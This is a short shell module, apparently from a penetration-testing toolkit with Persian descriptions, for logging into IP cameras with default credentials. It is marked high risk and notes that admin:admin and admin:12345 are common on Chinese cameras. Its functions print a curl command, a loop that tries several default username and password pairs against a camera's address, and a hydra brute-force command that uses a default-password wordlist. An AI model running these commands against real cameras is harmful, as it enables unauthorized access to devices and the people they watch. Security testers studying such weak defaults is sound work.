DESC="تلاش ورود با اعتبارنامه‌های پیش‌فرض دوربین"
REQ="hydra"
RISK="HIGH"
NOTE="admin:admin و admin:12345 روی دوربین‌های چینی خیلی رایج است"

termux(){ echo "curl -u admin:admin http://<IP>/"; }

kali(){
cat <<'EOF'
for c in admin:admin admin:12345 admin:password admin:"" root:root admin:888888; do
  u=${c%%:*}; p=${c##*:}
  code=$(curl -s -o /dev/null -w '%{http_code}' -u "$u:$p" --max-time 5 "http://<IP>/")
  echo "$c -> $code"
done
# یا:
hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt <IP> http-get /
EOF
}
